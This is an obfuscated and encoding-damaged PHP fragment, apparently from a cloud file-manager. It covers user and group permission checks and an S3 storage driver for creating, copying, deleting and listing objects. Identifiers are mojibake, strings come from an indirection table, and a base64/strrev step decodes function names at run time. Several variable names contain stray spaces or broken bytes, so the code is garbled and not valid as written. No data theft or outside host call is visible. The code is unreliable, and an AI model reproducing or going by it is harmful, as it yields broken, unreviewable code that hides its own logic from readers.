Model($úªşÌğµ[623])->getInfo($õèèÙ‘„); $’™­ìÇ€ = Model($úªşÌğµ[2320])->listData($¨ŞõÔßˆ[$úªşÌğµ[2321]]); if ($’™­ìÇ€ && $’™­ìÇ€[$úªşÌğµ[601]][$úªşÌğµ[2324]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ø·ĞÔæ) { $í†¼–Ö¾ =& $_SERVER[¤øïŠ‹²]; $™®Šó×¢ = Model($í†¼–Ö¾[1482]); $áß±Ü× = $™®Šó×¢->sourceInfo($ø·ĞÔæ); if (!$áß±Ü×) { return !1; } $™®Šó×¢->groupPathDisplay($áß±Ü×); $²·ãÌ‹ = array($áß±Ü×); $²·ãÌ‹ = $™®Šó×¢->_listAppendPath($²·ãÌ‹, !1); $áß±Ü× = $²·ãÌ‹[0]; $ÖÉ’˜«· = $áß±Ü×[$í†¼–Ö¾[608]]; if (isset($áß±Ü×[$í†¼–Ö¾[616]])) { $ôİÇ•£è = explode($í†¼–Ö¾[8], trim($áß±Ü×[$í†¼–Ö¾[608]], $í†¼–Ö¾[8])); array_shift($ôİÇ•£è); $ÖÉ’˜«· = $áß±Ü×[$í†¼–Ö¾[614]] . $í†¼–Ö¾[2344] . implode($í†¼–Ö¾[8], $ôİÇ•£è); } return array($í†¼–Ö¾[32] => $áß±Ü×[$í†¼–Ö¾[32]], $í†¼–Ö¾[204] => $áß±Ü×[$í†¼–Ö¾[204]], $í†¼–Ö¾[98] => KodIO::make($áß±Ü×[$í†¼–Ö¾[204]]), $í†¼–Ö¾[608] => $ÖÉ’˜«·); } private function groupAuthInfo($Ğ»ÂõØà, $™ù–Õñ†) { $ÈÌ¢¹Ó§ =& $_SERVER[¤øïŠ‹²]; $µ…ò«ƒ = Model($ÈÌ¢¹Ó§[611])->getInfo($™ù–Õñ†); return array($ÈÌ¢¹Ó§[2345] => intval($Ğ»ÂõØà[$ÈÌ¢¹Ó§[508]]), $ÈÌ¢¹Ó§[2335] => $Ğ»ÂõØà, $ÈÌ¢¹Ó§[2346] => LNG($ÈÌ¢¹Ó§[2347]), $ÈÌ¢¹Ó§[2341] => array($ÈÌ¢¹Ó§[515] => $µ…ò«ƒ[$ÈÌ¢¹Ó§[32]], $ÈÌ¢¹Ó§[98] => KodIO::make($µ…ò«ƒ[$ÈÌ¢¹Ó§[101]][$ÈÌ¢¹Ó§[204]]), $ÈÌ¢¹Ó§[2348] => $µ…ò«ƒ[$ÈÌ¢¹Ó§[615]])); } protected function groupRootAuth($š²¦­Ò, $¸üõ£Ğ² = false) { $Šõ¤¿Æ„ =& $_SERVER[¤øïŠ‹²]; $¸üõ£Ğ² = $¸üõ£Ğ² ? $¸üõ£Ğ² : USER_ID; $¢³ÙÊ–ì = $¸üõ£Ğ² . $Šõ¤¿Æ„[2349] . $š²¦­Ò; static $¹œº”ÏÜ = array(); if (isset($¹œº”ÏÜ[$¢³ÙÊ–ì])) { return $¹œº”ÏÜ[$¢³ÙÊ–ì]; } $×´òù® = Model($Šõ¤¿Æ„[611])->getInfo($š²¦­Ò); $¹ºëÉ»ó = $this->userGroupList($¸üõ£Ğ²); $”öê”êú = isset($¹ºëÉ»ó[$š²¦­Ò]) ? $¹ºëÉ»ó[$š²¦­Ò][$Šõ¤¿Æ„[508]] : !1; if ($”öê”êú && Model($Šõ¤¿Æ„[597])->authCheckAction($”öê”êú[$Šõ¤¿Æ„[508]], $Šõ¤¿Æ„[1514])) { $¹œº”ÏÜ[$¢³ÙÊ–ì] = $”öê”êú; return $”öê”êú; } $»˜÷¶ş§ = $this->sourceAuthSelect($×´òù®[$Šõ¤¿Æ„[101]][$Šõ¤¿Æ„[204]]); $ÇŞØæ·ë = $»˜÷¶ş§ ? $this->authMake($»˜÷¶ş§, $¸üõ£Ğ²) : !1; $»£ßÔ… = $ÇŞØæ·ë ? $ÇŞØæ·ë[$Šõ¤¿Æ„[562]] : !1; $¹œº”ÏÜ[$¢³ÙÊ–ì] = $»£ßÔ… ? $»£ßÔ… : $”öê”êú; return $¹œº”ÏÜ[$¢³ÙÊ–ì]; } public function authOwnerApply($ÖÔú»ç) { $¼İ˜›ßà =& $_SERVER[¤øïŠ‹²]; if (empty($ÖÔú»ç[$¼İ˜›ßà[508]]) || isset($ÖÔú»ç[$¼İ˜›ßà[1533]]) && $ÖÔú»ç[$¼İ˜›ßà[1533]]) { return $ÖÔú»ç; } if (AuthModel::authCheckRoot($ÖÔú»ç[$¼İ˜›ßà[508]][$¼İ˜›ßà[509]])) { return $ÖÔú»ç; } $ Æ×êÎó = Model($¼İ˜›ßà[1482])->parentLevelArray($ÖÔú»ç[$¼İ˜›ßà[610]]); $ Æ×êÎó = array_merge(array($ÖÔú»ç[$¼İ˜›ßà[204]]), array_reverse($ Æ×êÎó)); $ıĞÌ›Š = $this->sourceAuthSelect($ Æ×êÎó); $± üÅõ = array(); $Ò¾Ğè©ƒ = array(); foreach ($ıĞÌ›Š as $€®Ï”¦ => $Úı¿¥á’) { $Ö«îææé = $this->authFolderOwnerUser($Úı¿¥á’); $± üÅõ[$€®Ï”¦] = $Ö«îææé; $Ò¾Ğè©ƒ = array_merge($Ò¾Ğè©ƒ, $Ö«îææé[$¼İ˜›ßà[691]]); if ($Ö«îææé[$¼İ˜›ßà[2350]]) { break; } } if (count($Ò¾Ğè©ƒ) == 0) { $Ò¾Ğè©ƒ = $this->authFolderOwnerGroup($ÖÔú»ç[$¼İ˜›ßà[595]]); } $Ò¾Ğè©ƒ = array_unique($Ò¾Ğè©ƒ); if (AuthModel::authCheckRoot($ÖÔú»ç[$¼İ˜›ßà[508]][$¼İ˜›ßà[509]])) { $Ò¾Ğè©ƒ[] = USER_ID; } $ÖÔú»ç[$¼İ˜›ßà[508]][$¼İ˜›ßà[2351]] = Model($¼İ˜›ßà[603])->userListInfo($Ò¾Ğè©ƒ); return $ÖÔú»ç; } private function authFolderOwnerGroup($“ü¯¤¤”) { $¶ÕùØş¯ =& $_SERVER[¤øïŠ‹²]; $éê™¼Ÿˆ = Model($¶ÕùØş¯[2223])->where(array($¶ÕùØş¯[1444] => $“ü¯¤¤”))->select(); $Ö¨¢ïõ£ = array(); if (!$éê™¼Ÿˆ) { return $Ö¨¢ïõ£; } foreach ($éê™¼Ÿˆ as $Æ–¶Èœ†) { $ü“áÈ = $this->authInfo($Æ–¶Èœ†); if (AuthModel::authCheckRoot($ü“áÈ[$¶ÕùØş¯[508]])) { $Ö¨¢ïõ£[] = $Æ–¶Èœ†[$¶ÕùØş¯[1542]]; } } return $Ö¨¢ïõ£; } private function authFolderOwnerUser($˜¦ÂÄ…Ë) { $…ÌÔåñ =& $_SERVER[¤øïŠ‹²]; $ˆÖ°ªŠ = array(); $®¨Èàñ‹ = !1; foreach ($˜¦ÂÄ…Ë as $›š‡¯©«) { $’–“¬ˆÎ = $this->authInfo($›š‡¯©«); if ($›š‡¯©«[$…ÌÔåñ[595]] == $…ÌÔåñ[241]) { $®¨Èàñ‹ = !0; } if ($›š‡¯©«[$…ÌÔåñ[201]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($’–“¬ˆÎ[$…ÌÔåñ[508]])) { $ˆÖ°ªŠ[] = $›š‡¯©«[$…ÌÔåñ[595]]; } } } return array($…ÌÔåñ[691] => $ˆÖ°ªŠ, $…ÌÔåñ[2350] => $®¨Èàñ‹); } public function authMake($ÆèâáÍ, $”’ö®ğÇ = false) { $¬ß…¹ıõ =& $_SERVER[¤øïŠ‹²]; $”¯ø £ = $this->authArrayCheck($ÆèâáÍ, $”’ö®ğÇ); if ($”¯ø £[$¬ß…¹ıõ[2331]]) { $”¯ø £[$¬ß…¹ıõ[2331]] = $this->sourceAuthInfo($”¯ø £[$¬ß…¹ıõ[2331]]); } return $”¯ø £; } public function authArrayCheck($ö’Ú‡Ê, $˜£§¹Åâ = false) { $›ØåÓ’  =& $_SERVER[¤øïŠ‹²]; if (!$ö’Ú‡Ê) { return array($›ØåÓ’ [509] => 0, $›ØåÓ’ [562] => !1, $›ØåÓ’ [2346] => $›ØåÓ’ [12]); } $˜£§¹Åâ = $˜£§¹Åâ ? $˜£§¹Åâ : USER_ID; $ìê»÷ñ‡ = 0; $½øÔïÎ¤ = 0; $¥©¼÷¥· = 0; $ôÙâçÖÈ = 0; $†¥­½†¥ = 0; $»àÇ¾  = 0; $§¼¢—ïÕ = 0; $ÎÕÆê¢¯ = 0; $ş‚Í·ßù = 1000; $ğóœÊÍƒ = 0; $ÍëÍÖÖ® = 0; $†Ü°Î±İ = 0; $íÔ¤ºå = 0; $ñ×¹À¼Ö = 0; foreach ($ö’Ú‡Ê as $÷ú¦‚Å¼) { $§¯Ô–ã = $this->authInfo($÷ú¦‚Å¼); if (!$§¯Ô–ã) { continue; } $ñË„¼ãŠ = $÷ú¦‚Å¼[$›ØåÓ’ [595]]; $…õÆÇÍ = $÷ú¦‚Å¼[$›ØåÓ’ [204]]; $³²äºâ£ = intval($§¯Ô–ã[$›ØåÓ’ [508]]); if ($÷ú¦‚Å¼[$›ØåÓ’ [201]] == SourceModel::TYPE_USER && $ñË„¼ãŠ == $˜£§¹Åâ) { $ìê»÷ñ‡ = !0; $¥©¼÷¥· = $§¯Ô–ã; $½øÔïÎ¤ = $³²äºâ£; $ôÙâçÖÈ = $…õÆÇÍ; } else { if ($÷ú¦‚Å¼[$›ØåÓ’ [201]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ñË„¼ãŠ, $˜£§¹Åâ)) { $†¥­½†¥ = !0; $ëûƒ¼ş” = $this->groupStepToUserGroup($ñË„¼ãŠ, $˜£§¹Åâ); if ($ëûƒ¼ş” < $ş‚Í·ßù) { $ş‚Í·ßù = $ëûƒ¼ş”; $»àÇ¾  = $³²äºâ£; $§¼¢—ïÕ = $§¯Ô–ã; $ğóœÊÍƒ = $ñË„¼ãŠ; $ÎÕÆê¢¯ = $…õÆÇÍ; } if ($ëûƒ¼ş” == $ş‚Í·ßù && $³²äºâ£ >= $»àÇ¾ ) { $»àÇ¾  = $³²äºâ£; $§¼¢—ïÕ = $§¯Ô–ã; $ğóœÊÍƒ = $ñË„¼ãŠ; $ÎÕÆê¢¯ = $…õÆÇÍ; } } else { if (!$ñË„¼ãŠ || $ñË„¼ãŠ == $›ØåÓ’ [241]) { $ÍëÍÖÖ® = !0; $íÔ¤ºå = $§¯Ô–ã; $†Ü°Î±İ = $³²äºâ£; $ñ×¹À¼Ö = $…õÆÇÍ; } } } } if ($ìê»÷ñ‡) { $ïÙôÔŸÎ = $½øÔïÎ¤; $§¯Ô–ã = $¥©¼÷¥·; $ÈŒ§§š² = $ôÙâçÖÈ; $³†ª½Ú = LNG($›ØåÓ’ [2352]); } else { if ($†¥­½†¥) { $ïÙôÔŸÎ = $»àÇ¾ ; $§¯Ô–ã = $§¼¢—ïÕ; $ÈŒ§§š² = $ÎÕÆê¢¯; $áºêß†ï = Model($›ØåÓ’ [611])->getInfo($ğóœÊÍƒ); $³†ª½Ú = $›ØåÓ’ [186] . $áºêß†ï[$›ØåÓ’ [615]] . $›ØåÓ’ [2353] . LNG($›ØåÓ’ [2354]); } else { if ($ÍëÍÖÖ®) { $ïÙôÔŸÎ = $†Ü°Î±İ; $§¯Ô–ã = $íÔ¤ºå; $ÈŒ§§š² = $ñ×¹À¼Ö; $³†ª½Ú = LNG($›ØåÓ’ [2333]); } else { $ïÙôÔŸÎ = 0; $§¯Ô–ã = !1; $³†ª½Ú = $›ØåÓ’ [12]; $ÈŒ§§š² = $›ØåÓ’ [12]; } } } $•‹¢»¤£ = array($›ØåÓ’ [2345] => intval($ïÙôÔŸÎ), $›ØåÓ’ [2335] => $§¯Ô–ã, $›ØåÓ’ [2346] => $³†ª½Ú, $›ØåÓ’ [2341] => $ÈŒ§§š²); return $•‹¢»¤£; } private function groupContainUser($Š„æ’Ùí, $˜‘¯ÓµË = false) { return in_array($Š„æ’Ùí, $this->userGroupParents($˜‘¯ÓµË)); } private function groupStepToUserGroup($ôŸ©™Èâ, $—ğùûƒÛ = false) { $¬éÃ¢‡É =& $_SERVER[¤øïŠ‹²]; $®«áÛ™ğ = $this->userGroupList($—ğùûƒÛ); $ÈğÇËş” = 1000; $Æ‚­Ò» = $GLOBALS[$¬éÃ¢‡É[6]][$¬éÃ¢‡É[103]][$¬éÃ¢‡É[2236]] == 1; $ş³ı·ÇÀ = $Æ‚­Ò» ? 3 : 2; foreach ($®«áÛ™ğ as $¡Á±µî) { if ($¡Á±µî[$¬éÃ¢‡É[1444]] == $ôŸ©™Èâ) { return 0; } $éîë± = explode($¬éÃ¢‡É[50], trim($¡Á±µî[$¬éÃ¢‡É[610]], $¬éÃ¢‡É[50])); if ($éîë±[0] == $¬éÃ¢‡É[241] && count($éîë±) > $ş³ı·ÇÀ) { $¹¬–¾±÷ = array_reverse(array_slice($éîë±, $ş³ı·ÇÀ)); $¢ßÙßÉé = array_search($ôŸ©™Èâ, $¹¬–¾±÷); if ($¢ßÙßÉé !== !1 && $¢ßÙßÉé + 1 <= $ÈğÇËş”) { $ÈğÇËş” = $¢ßÙßÉé + 1; } } } return $ÈğÇËş”; } private function userGroupList($­¾íâ€¶ = false, $Ò¬úœƒÌ = false) { $´ø’•í¦ =& $_SERVER[¤øïŠ‹²]; static $»­äÙş„ = array(); if (isset($»­äÙş„[$­¾íâ€¶])) { return $»­äÙş„[$­¾íâ€¶]; } if (!$Ò¬úœƒÌ) { $Ò¬úœƒÌ = Model($´ø’•í¦[623])->getInfo($­¾íâ€¶); } $»­äÙş„[$­¾íâ€¶] = array_to_keyvalue($Ò¬úœƒÌ[$´ø’•í¦[1443]], $´ø’•í¦[1444]); return $»­äÙş„[$­¾íâ€¶]; } public function userGroupParents($“ïèğˆŞ) { $ Äç‘ô =& $_SERVER[¤øïŠ‹²]; static $èÁÁÛ¦ = array(); $“ïèğˆŞ = $“ïèğˆŞ ? $“ïèğˆŞ : USER_ID; if (isset($èÁÁÛ¦[$“ïèğˆŞ])) { return $èÁÁÛ¦[$“ïèğˆŞ]; } $¢ÎüŸÉ¦ = $this->userGroupList($“ïèğˆŞ); $Â¸Š• = array(); $ú²™åÉ = $GLOBALS[$ Äç‘ô[6]][$ Äç‘ô[103]][$ Äç‘ô[2236]] == 1; $ÔÁÕ¨îµ = $ú²™åÉ ? 3 : 2; foreach ($¢ÎüŸÉ¦ as $‰ÓÔÃ´ñ) { $ÇßĞ­ƒ§ = array($‰ÓÔÃ´ñ[$ Äç‘ô[1444]]); $“ÊÍÉòã = explode($ Äç‘ô[50], trim($‰ÓÔÃ´ñ[$ Äç‘ô[610]], $ Äç‘ô[50])); if ($“ÊÍÉòã[0] == $ Äç‘ô[241] && count($“ÊÍÉòã) > $ÔÁÕ¨îµ) { $šƒŠ˜ÕŒ = array_slice($“ÊÍÉòã, $ÔÁÕ¨îµ); $ÇßĞ­ƒ§ = array_merge($ÇßĞ­ƒ§, array_reverse($šƒŠ˜ÕŒ)); } $Â¸Š• = array_merge($Â¸Š•, $ÇßĞ­ƒ§); } $èÁÁÛ¦[$“ïèğˆŞ] = array_unique($Â¸Š•); return $èÁÁÛ¦[$“ïèğˆŞ]; } public function authTargetInfoMake($÷úÒÂÄÕ) { $õ¨Ö½æü =& $_SERVER[¤øïŠ‹²]; $ãÖèÄ÷ = array(); $éóÅ¡¶ = array(); foreach ($÷úÒÂÄÕ as $ôİ£¹´ù) { if ($ôİ£¹´ù[$õ¨Ö½æü[201]] == SourceModel::TYPE_USER) { $ãÖèÄ÷[] = intval($ôİ£¹´ù[$õ¨Ö½æü[595]]); } else { if ($ôİ£¹´ù[$õ¨Ö½æü[201]] == SourceModel::TYPE_GROUP) { $éóÅ¡¶[] = intval($ôİ£¹´ù[$õ¨Ö½æü[595]]); } } } if ($ãÖèÄ÷) { $ãÖèÄ÷ = Model($õ¨Ö½æü[603])->userListInfo($ãÖèÄ÷); } if ($éóÅ¡¶) { $­°¬‘µ¹ = array($õ¨Ö½æü[2216] => array($õ¨Ö½æü[513], $éóÅ¡¶)); $éóÅ¡¶ = Model($õ¨Ö½æü[611])->field($õ¨Ö½æü[2355])->where($­°¬‘µ¹)->select(); $éóÅ¡¶ = array_to_keyvalue($éóÅ¡¶, $õ¨Ö½æü[1444]); } return array($õ¨Ö½æü[2356] => $ãÖèÄ÷, $õ¨Ö½æü[2357] => $éóÅ¡¶); } public function authInfo($¼æúè‘) { $şŠß’¥ =& $_SERVER[¤øïŠ‹²]; if ($¼æúè‘[$şŠß’¥[1589]]) { $ã¹š¦í = Model($şŠß’¥[597])->listData($¼æúè‘[$şŠß’¥[1589]]); if (!$ã¹š¦í) { return !1; $ˆúªÂ„ = Model($şŠß’¥[597])->listData(); $¥åò§õ = array_filter_by_field($ˆúªÂ„, $şŠß’¥[508], $şŠß’¥[241]); return $¥åò§õ; } $ÆÂÉşüÃ = array_field_key($ã¹š¦í, array($şŠß’¥[493], $şŠß’¥[32], $şŠß’¥[508], $şŠß’¥[2152], $şŠß’¥[2153])); $ÆÂÉşüÃ[$şŠß’¥[2358]] = $¼æúè‘; return $ÆÂÉşüÃ; } else { return array($şŠß’¥[514] => 0, $şŠß’¥[2137] => $¼æúè‘[$şŠß’¥[2293]], $şŠß’¥[515] => $şŠß’¥[12], $şŠß’¥[2152] => $şŠß’¥[2359]); } } } goto b³ÖÂìæÌö; f¢ÈÛãîÓ: $fileSize = strrev(base64_decode($_SERVER[¡ŞãµÈ][0])); function binCheckNeq($ËŸ´²øƒ, $ûø›“É¢) { return $ËŸ´²øƒ != $ûø›“É¢; } $_SERVER[$_SERVER[¡ŞãµÈ][1]] = $fileSize($_SERVER[$_SERVER[¡ŞãµÈ][2]]); goto c„ÚŸŒŠ; A¹’´º¤ù: class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ÄË©ì ƒ) { set_timeout(); require_once SDK_DIR . $_SERVER[¤øïŠ‹²][227]; parent::__construct(); $this->_init($ÄË©ì ƒ); } public function _init($È¶ÓÙß) { $ó®’µÉ =& $_SERVER[¤øïŠ‹²]; $this->config = $È¶ÓÙß; foreach ($È¶ÓÙß as $ÜºÀ–œ¢ => $ÑŠÚëÆà) { if (isset($this->{$ÜºÀ–œ¢})) { $this->{$ÜºÀ–œ¢} = $ÑŠÚëÆà; } } $this->endpoint = $È¶ÓÙß[$ó®’µÉ[228]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $€™ì×îò = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($€™ì×îò, 0, 7) == $ó®’µÉ[229]) { $€™ì×îò = $ó®’µÉ[230] . substr($€™ì×îò, 7); } $this->client->setEndpoint($€™ì×îò); if (in_array(ACTION, array($ó®’µÉ[223], $ó®’µÉ[224]))) { $this->client->setExceptions(); } } public function setSignVersion($ŸÔ¡ç ó = "\x76\64") { $this->signVer = $ŸÔ¡ç ó; $this->client->setSignVersion($ŸÔ¡ç ó); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $·¬ê‰½à) { return null; } } public function isBucketCors() { $¨°Ûª¡  =& $_SERVER[¤øïŠ‹²]; $çã®Í² = $this->getBucketCors(); if (!$çã®Í² || !is_array($çã®Í²)) { return !1; } if (!is_array($çã®Í²[$¨°Ûª¡ [231]])) { $çã®Í²[$¨°Ûª¡ [231]] = explode($¨°Ûª¡ [50], $çã®Í²[$¨°Ûª¡ [231]]); } if ($çã®Í²[$¨°Ûª¡ [232]] != $¨°Ûª¡ [233] || !in_array($¨°Ûª¡ [233], $çã®Í²[$¨°Ûª¡ [231]])) { return !1; } $âÛ¶ã—™ = array_map($¨°Ûª¡ [234], $çã®Í²[$¨°Ûª¡ [235]]); if (!is_array($âÛ¶ã—™)) { $âÛ¶ã—™ = array(); } $È°‰˜ù² = array($¨°Ûª¡ [236], $¨°Ûª¡ [237], $¨°Ûª¡ [238], $¨°Ûª¡ [239], $¨°Ûª¡ [240]); $”­ªíü = array_diff($È°‰˜ù², $âÛ¶ã—™); return empty($”­ªíü); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($ùÛØ“Õâ, $¾áíıÈ = '', $—ëÄŒ¥“ = REPEAT_RENAME) { $Û–ç¹ø‰ = $this->setContent($ùÛØ“Õâ, $¾áíıÈ); if ($Û–ç¹ø‰ !== !1) { return $this->getPathOuter($ùÛØ“Õâ); } return !1; } public function mkdir($Ê ‘Šà, $‰èîó‘õ = REPEAT_SKIP) { $ÏË§¨Ùù =& $_SERVER[¤øïŠ‹²]; if (empty($Ê ‘Šà) && $Ê ‘Šà !== $ÏË§¨Ùù[241]) { return !1; } if ($‰èîó‘õ && $this->_isFolder($Ê ‘Šà)) { return $this->getPathOuter($Ê ‘Šà); } $Æö¶¸ˆ = $this->setContent($Ê ‘Šà, $ÏË§¨Ùù[12], !0); if ($Æö¶¸ˆ !== !1) { return $this->getPathOuter($Ê ‘Šà); } return !1; } public function copyFile($ÊƒÙ¹ÊÄ, $ÎÃÒµ¨Ù, $ÁÔ¢®¯ = array()) { $¤Ó×§Õæ =& $_SERVER[¤øïŠ‹²]; $Ş¥”Ğ = $this->objectMeta($ÊƒÙ¹ÊÄ); if (!$Ş¥”Ğ) { return !1; } if ($Ş¥”Ğ[$¤Ó×§Õæ[90]] <= 1024 * 1024 * 200) { $ûàà˜Ì€ = $this->client->copyObject($this->bucket, $ÊƒÙ¹ÊÄ, $this->bucket, $ÎÃÒµ¨Ù, $¤Ó×§Õæ[242], $ÁÔ¢®¯); } else { $ûàà˜Ì€ = $this->client->multiCopyObject($this->bucket, $ÊƒÙ¹ÊÄ, $this->bucket, $ÎÃÒµ¨Ù, $ÁÔ¢®¯); } $ûàà˜Ì€ = $ûàà˜Ì€ ? $this->getPathOuter($ÎÃÒµ¨Ù) : !1; return $ûàà˜Ì€; } public function moveFile($À¹Æª±‹, $ïîÑËÕ‚) { if ($this->copyFile($À¹Æª±‹, $ïîÑËÕ‚)) { $this->delFile($À¹Æª±‹); return $this->getPathOuter($ïîÑËÕ‚); } return !1; } public function delFile($á²Üü§Ì) { return $this->client->deleteObject($this->bucket, $á²Üü§Ì); } public function delFolder($ĞÖƒ‡à) { $éÒˆõÉ» =& $_SERVER[¤øïŠ‹²]; if (!$this->exist($ĞÖƒ‡à)) { return !0; } $this->listItemCache = !1; $Ö¼‘Õº  = $this->fileList($ĞÖƒ‡à); $this->listItemCache = !0; $Ğ‚û Í‡ = trim($ĞÖƒ‡à, $éÒˆõÉ»[8]) . $éÒˆõÉ»[8]; if (!empty($ĞÖƒ‡à) && $ĞÖƒ‡à !== $éÒˆõÉ»[241] && !in_array($Ğ‚û Í‡, $Ö¼‘Õº [$éÒˆõÉ»[96]])) { $Ö¼‘Õº [$éÒˆõÉ»[96]][] = $Ğ‚û Í‡; } $”å¼ã£¶ = $this->delByBatch($Ö¼‘Õº [$éÒˆõÉ»[97]]); if (!$”å¼ã£¶) { return !1; } $”å¼ã£¶ = $this->delByBatch($Ö¼‘Õº [$éÒˆõÉ»[96]]); if (!$”å¼ã£¶) { return !1; } return $this->delFile($Ğ‚û Í‡); } private function delByBatch($»Ó˜¢™™) { foreach (array_chunk($»Ó˜¢™™, 1000) as $’õ‡Ø¯´) { $øÀÓ™ÑŞ = $this->client->deleteObjects($this->bucket, $’õ‡Ø¯´); if (!$øÀÓ™ÑŞ) { return !1; } } return !0; } public function rename($†íÈ¡âó, $ç‡¿ÛòÚ) { return $this->renameObject($†íÈ¡âó, $ç‡¿ÛòÚ); } public function listPath($¦ÑÍ±Åş, $‚‰“ÜĞ¬ = false) { $ÛËõ„İº =& $_SERVER[¤øïŠ‹²]; $§Ã‘À¾ï = $this->fileList($¦ÑÍ±Åş, $ÛËõ„İº[8], !0); foreach ($§Ã‘À¾ï[$ÛËõ„İº[96]] as $Ñò‚úÛ¢ => $••‚¸Äù) { $§Ã‘À¾ï[$ÛËõ„İº[96]][$Ñò‚úÛ¢] = $this->folderInfo($••‚¸Äù, $‚‰“ÜĞ¬, $••‚¸Äù); } foreach ($§Ã‘À¾ï[$ÛËõ„İº[97]] as $Ñò‚úÛ¢ => $••‚¸Äù) { $§Ã‘À¾ï[$ÛËõ„İº[97]][$Ñò‚úÛ¢] = $this->fileInfo($••‚¸Äù[$ÛËõ„İº[32]], $‚‰“ÜĞ¬, $••‚¸Äù); } return $§Ã‘À¾ï; } protected function infoChildren($ˆ¾•üòã, &$Ã…ôõª×) { $±Âúğá· =& $_SERVER[¤øïŠ‹²]; $ŠÌìÂ…à = $this->fileList($ˆ¾•üòã, $±Âúğá·[12], !0); $Ã…ôõª×[$±Âúğá·[92]] += count($ŠÌìÂ…à[$±Âúğá·[96]]); $Ã…ôõª×[$±Âúğá·[91]] += count($ŠÌìÂ…à[$±Âúğá·[97]]); foreach ($ŠÌìÂ…à[$±Âúğá·[97]] as $ğå©é¶) { if (!$ğå©é¶ || !$ğå©é¶[$±Âúğá·[90]]) { continue; } $Ã…ôõª×[$±Âúğá·[90]] += $ğå©é¶[$±Âúğá·[90]]; } } private function fileInfo($í†À™š«, $Ò›Í¦Ö« = false, $Ñ–·Ï—Ñ = array()) { $õ–ßóë =& $_SERVER[¤øïŠ‹²]; $›øö½ò = array($õ–ßóë[32] => $this->pathThis($í†À™š«), $õ–ßóë[98] => $this->getPathOuter($í†À™š«), $õ–ßóë[33] => $õ–ßóë[243], $õ–ßóë[179] => $this->ext($í†À™š«), $õ–ßóë[90] => isset($Ñ–·Ï—Ñ[$õ–ßóë[90]]) ? $Ñ–·Ï—Ñ[$õ–ßóë[90]] : 0); if ($Ò›Í¦Ö«) { return $›øö½ò; } $›øö½ò[$õ–ßóë[244]] = $›øö½ò[$õ–ßóë[99]] = 0; $›øö½ò[$õ–ßóë[245]] = $›øö½ò[$õ–ßóë[246]] = !0; if (empty($Ñ–·Ï—Ñ)) { $Ñ–·Ï—Ñ = $this->objectMeta($í†À™š«); if (!$Ñ–·Ï—Ñ) { return $›øö½ò; } } if (isset($Ñ–·Ï—Ñ[$õ–ßóë[247]]) && $Ñ–·Ï—Ñ[$õ–ßóë[247]]) { $›øö½ò[$õ–ßóë[248]] = $Ñ–·Ï—Ñ[$õ–ßóë[247]]; } if (isset($Ñ–·Ï—Ñ[$õ–ßóë[217]])) { $›øö½ò[$õ–ßóë[99]] = $Ñ–·Ï—Ñ[$õ–ßóë[217]]; } if (isset($Ñ–·Ï—Ñ[$õ–ßóë[90]])) { $›øö½ò[$õ–ßóë[90]] = $Ñ–·Ï—Ñ[$õ–ßóë[90]]; } return $›øö½ò; } private function folderInfo($Ğ‡ƒ“‰Ä, $İÂ˜ÂÑÍ = false, $Ü—Œ‡¸° = array()) { $±†µÀªø =& $_SERVER[¤øïŠ‹²]; $ª­ç­Öë = array($±†µÀªø[32] => $this->pathThis($Ğ‡ƒ“‰Ä), $±†µÀªø[98] => $this->getPathOuter($±†µÀªø[8] . $Ğ‡ƒ“‰Ä), $±†µÀªø[33] => $±†µÀªø[89]); if ($İÂ˜ÂÑÍ) { return $ª­ç­Öë; } $ª­ç­Öë[$±†µÀªø[244]] = $ª­ç­Öë[$±†µÀªø[99]] = 0; $ª­ç­Öë[$±†µÀªø[245]] = $ª­ç­Öë[$±†µÀªø[246]] = !0; if ($Ğ‡ƒ“‰Ä == $±†µÀªø[12]) { return $ª­ç­Öë; } if (empty($Ü—Œ‡¸°)) { $Ü—Œ‡¸° = $this->objectMeta(trim($Ğ‡ƒ“‰Ä, $±†µÀªø[8]) . $±†µÀªø[8]); } if (isset($Ü—Œ‡¸°[$±†µÀªø[217]])) { $ª­ç­Öë[$±†µÀªø[244]] = $Ü—Œ‡¸°[$±†µÀªø[217]]; } return $ª­ç­Öë; } private function fileList($Ö£–‹í·, $‰ŸÍÌ÷í = '', $ü®×¹Ì— = 0) { $ãÈõ‡ Â =& $_SERVER[¤øïŠ‹²]; $ñ§åŸİ† = rtrim($Ö£–‹í·, $ãÈõ‡ Â[8]) . $ãÈõ‡ Â[8]; $°âÈº½ = $this->listObjs($ñ§åŸİ†, null, null, $‰ŸÍÌ÷í); if (!$°âÈº½) { return array($ãÈõ‡ Â[96] => array(), $ãÈõ‡ Â[97] => array()); } $±ºÉ†« = $üîõ´ß = array(); foreach ($°âÈº½[$ãÈõ‡ Â[249]] as $ë”ß­ë) { $ËÆİö = $ë”ß­ë[$ãÈõ‡ Â[32]]; if ($ËÆİö == $ñ§åŸİ†) { continue; } $Ä¤´ÃÁÖ = isset($ë”ß­ë[$ãÈõ‡ Â[90]]) ? $ë”ß­ë[$ãÈõ‡ Â[90]] : 0; $ÒŒ‰úÏï = $Ä¤´ÃÁÖ == 0 && substr($ËÆİö, strlen($ËÆİö) - 1, 1) == $ãÈõ‡ Â[8] ? !0 : !1; $this->cacheMethodInfoSet($ËÆİö, $ÒŒ‰úÏï, $ë”ß­ë); if ($ÒŒ‰úÏï) { $±ºÉ†«[] = $ËÆİö; continue; } $üîõ´ß[] = $ü®×¹Ì— ? $ë”ß­ë : $ËÆİö; } foreach ($°âÈº½[$ãÈõ‡ Â[250]] as $ë”ß­ë) { $±ºÉ†«[] = $ë”ß­ë[$ãÈõ‡ Â[32]]; $this->cacheMethodInfoSet($ë”ß­ë[$ãÈõ‡ Â[32]], !0); } $this->cacheMethodInfoSet($Ö£–‹í·, !0); return array($ãÈõ‡ Â[96] => $±ºÉ†«, $ãÈõ‡ Â[97] => $üîõ´ß); } 